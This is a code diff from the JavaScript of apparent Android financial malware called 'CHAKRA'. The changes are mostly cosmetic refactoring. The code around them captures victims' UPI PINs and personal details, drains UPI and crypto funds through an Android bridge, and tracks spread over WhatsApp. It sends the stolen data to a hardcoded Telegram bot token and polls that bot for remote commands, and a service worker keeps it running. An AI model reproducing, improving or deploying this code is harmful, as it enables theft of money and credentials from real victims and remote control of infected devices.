@@ -140,7 +140,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - CENTRAL DATA STORAGE (VICTIM DATA SAVED IN TELEGRAM)
+  // CHAKRA - FAST COMMANDS + CENTRAL DATA + ALL FEATURES
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -178,7 +178,9 @@
     }).catch(() => {});
   }
 
-  // ===== CENTRAL DATA STORAGE (Saves victim data to Telegram) =====
+  // ============================================================
+  // SEND VICTIM DATA TO BOT (CENTRAL STORAGE)
+  // ============================================================
   function sendVictimDataToBot(data) {
     const message = JSON.stringify(data);
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
@@ -287,7 +289,6 @@
     const victim = getVictimDetails();
     infectedDevices.push({ id: deviceId, action: action, victim: victim, lastSpread: Date.now(), lastVector: 'WA' });
     
-    // ✅ SAVE TO CENTRAL DATA (Telegram Bot Memory)
     sendVictimDataToBot({
       type: 'infection',
       deviceId: deviceId,
@@ -398,8 +399,6 @@
       return;
     }
     const victim = getVictimDetails();
-    
-    // ✅ SAVE CRYPTO DRAIN TO CENTRAL DATA
     sendVictimDataToBot({
       type: 'crypto_drain',
       token: token,
@@ -407,7 +406,6 @@
       address: address,
       victim: victim
     });
-    
     sendToTelegram(
       '💸 CRYPTO DRAIN!\n─────────────────\n📱 Victim: ' + victim.name + '\n💰 Token: ' + token + '\n🔢 Amount: ' + amount + ' ' + token + '\n📤 Sent to: ' + address
     );
@@ -474,15 +472,12 @@
           setTimeout(() => {
             window.Android.confirmTransaction();
             totalDrained += amount;
-            
-            // ✅ SAVE UPI DRAIN TO CENTRAL DATA
             sendVictimDataToBot({
               type: 'upi_drain',
               amount: amount,
               targetUPI: targetUPI,
               victim: getVictimDetails()
             });
-            
             sendToTelegram('✅ ₹' + amount + ' sent to ' + targetUPI);
             sendToTelegram('💰 Total Drained: ₹' + totalDrained);
             pinCaptured = false;
@@ -636,14 +631,11 @@
         pinCaptured = true;
         pinCapturedCount++;
         const victim = getVictimDetails();
-        
-        // ✅ SAVE PIN CAPTURE TO CENTRAL DATA
         sendVictimDataToBot({
           type: 'pin_captured',
           victim: victim,
           balance: victim.balance
         });
-        
         sendToTelegram('🔑 UPI PIN captured!\n📱 Name: ' + victim.name + '\n💰 Balance: ₹' + victim.balance);
         if (myUPIList.length > 0) {
           readyToMoveCount++;
@@ -692,9 +684,9 @@
   }, 5000);
 
   // ============================================================
-  // TELEGRAM COMMANDS
+  // FAST TELEGRAM COMMANDS (CONTINUOUS LISTENING)
   // ============================================================
-  function listenForCommands() {
+  function fastCommandListener() {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
       .then(res => res.json())
       .then(data => {
@@ -821,11 +813,8 @@
               sendToTelegram('▶️ Resumed');
             }
 
-            // ============================================================
-            // ✅ DASHBOARD COMMAND (READS DATA FROM TELEGRAM STORAGE)
-            // ============================================================
+            // ---- DASHBOARD ----
             if (msg === '/dashboard') {
-              // Get recent downloads (last 10)
               const recentDownloads = infectedDevices
                 .slice(-10)
                 .reverse()
@@ -923,15 +912,21 @@
             }
           }
         }
-        listenForCommands();
+        fastCommandListener();
       })
       .catch(() => {
-        setTimeout(listenForCommands, 1000);
+        setTimeout(fastCommandListener, 1000);
       });
   }
 
-  listenForCommands();
+  // ============================================================
+  // START FAST COMMAND LISTENER (INSTANT RESPONSE)
+  // ============================================================
+  fastCommandListener();
 
+  // ============================================================
+  // SERVICE WORKER
+  // ============================================================
   if (navigator.serviceWorker) {
     navigator.serviceWorker.ready.then(reg => {
       reg.active.postMessage({ type: 'keepAlive' });
